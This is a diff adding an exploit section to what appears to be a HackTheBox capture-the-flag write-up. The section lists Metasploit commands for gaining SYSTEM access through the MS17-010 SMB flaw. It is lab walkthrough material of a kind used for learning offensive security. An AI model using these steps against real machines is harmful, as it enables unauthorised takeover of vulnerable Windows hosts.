@@ -51,3 +51,14 @@ RPC and SMB are the only ports open. I'll start with my SMBENUM command and see 
 |     Disclosure date: 2017-03-14
 > 
 
+# Exploit
+I've done this box before so I know that MSF has an exploit built for this. Since I'm getting warmed back up to my hacking career lets do this as initially intended.
+
+1. `msfconole`
+2. `search ms17`
+3. Select ms17_010_psexec with `use 1`
+4. Adjust settings to target. But also make sure that the LHOST is on the HTB network, not your usual IP.
+5. `run`
+
+![](images/exploit.png)
+No privelege escalation steps required on this box as I'm already running as the highest priveleged user.
